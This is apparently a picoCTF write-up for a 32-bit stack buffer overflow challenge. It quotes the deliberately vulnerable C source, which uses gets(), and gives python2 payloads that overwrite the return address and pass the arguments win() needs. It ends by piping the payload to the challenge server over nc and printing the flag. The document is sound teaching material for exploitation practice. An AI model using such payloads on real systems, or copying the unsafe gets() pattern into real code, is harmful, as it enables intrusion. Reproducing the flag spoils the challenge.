**Description**

Author: Sanjay C / Palash Oswal

Control the return address and arguments

Hints
(none)

**Tools**
This writeup is a large continuation of [buffer overflow 1](./binary/bufferoverflow1(200).md).
This is **highly** recomended to view first
Please see this writeup if you don't understand the leadup to this point.

In this writeup and subsequent binary exploitation writeups, I will be using the tools [Ghidra](https://github.com/NationalSecurityAgency/ghidra), [GDB](https://en.wikipedia.org/wiki/GNU_Debugger), and an extension for GDB called [pwndbg](https://github.com/pwndbg/pwndbg).
This tools together provide excellent static and dynamic analysis of a binary. 
Another tool to look at is radare2, however I did not use it for this writeup.
This competition is an excellent place to learn how to use these programs, however I will not be teaching them in entirety.

**Research**

Lets open the source and see what we need to get

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

This looks very similar to the last problem, except for one thing. On running the win funtion, we need to make sure the funciton gets its arguments as well. 
Lets look back to the stack diagram given in the last writeup to see what we may need to do to accomplish this.

![Image](https://www.secpod.com/blog/wp-content/uploads/2013/12/Untitled123.png)

Arguments are stored after EIP, so the next subsequent bytes should be our 2 arguments that need to be passed into the function as parameters. The arguments as shown in the source are ```0xcafef00d``` and ```0xf00df00d```

**Exploit**

Make sure to mark vuln as executable with ```chmod +x vuln```

Set up GDB with

```gdb vuln```

add your breakpoints at the locations that will help you solve the problem

```layout asm``` might be helpful to look for assembly that you want to set a breakpoint at to look at the memory at that time. 
The ```s``` command can step though your program one instruction at a time, or type a number after s to step multiple instructions.

Your varible is 100 characters long, and then after that you have the rest of your code
This command should try and jump to 0x63636363:

```r <<< $(python2 -c 'print("a"*100 + "b"*12 + "cccc")')```

Now, print the locaiton of win()

```
pwndbg> p *(win)
$1 = {<text variable, no debug info>} 0x8049296 <win>
```

Lets go to ```0x8049296```

```r <<< $(python2 -c 'print("a"*100 + "b"*12 + "\x96\x92\x04\x08")')```

Now, this doesn't get us our flag, as we still dont have our arguments put in however to verify that this works we can see that our test flag is in memory at EAX.

EBP is the function pointer, and variables and arguments are based off of that
In this case, the assembler says that 0xcafef00d should be at EBP + 8 and 0xf00df00d should be at EBP + 12
EBP points to the spot in memory of EIP
Variable, extra space, EIP, EBP + 4, EBP + 8, EBP + 12

Lets set our arguments now

```r <<< $(python2 -c 'print("a"*100 + "b"*12 + "\x96\x92\x04\x08" + "cccc" + "\x0d\xf0\xfe\xca" + "\x0d\xf0\x0d\xf0")')```

This gets us our test flag printed!
Lets test it outside of GDB

```python2 -c 'print("a"*100 + "b"*12 + "\x96\x92\x04\x08" + "cccc" + "\x0d\xf0\xfe\xca" + "\x0d\xf0\x0d\xf0")' | ./vuln```

Finally, lets get the flag from the challenge server

```python2 -c 'print("a"*100 + "b"*12 + "\x96\x92\x04\x08" + "cccc" + "\x0d\xf0\xfe\xca" + "\x0d\xf0\x0d\xf0")' | nc saturn.picoctf.net 56595```

This gets us our flag!
It is: ```picoCTF{argum3nt5_4_d4yZ_eb489c7a}```
